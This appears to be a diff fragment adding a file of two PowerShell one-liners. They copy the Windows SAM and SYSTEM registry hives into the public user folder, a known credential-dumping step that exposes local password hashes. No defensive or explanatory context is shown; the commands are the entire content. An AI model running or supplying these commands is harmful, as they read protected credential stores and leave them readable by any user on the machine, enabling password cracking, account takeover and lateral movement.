@@ -1,0 +1,2 @@
+powershell -c "[System.IO.File]::Copy('\\?\C:\Windows\System32\config\SAM', 'C:\Users\Public\sam.hiv')"
+powershell -c "[System.IO.File]::Copy('\\?\C:\Windows\System32\config\SYSTEM', 'C:\Users\Public\system.hiv')"
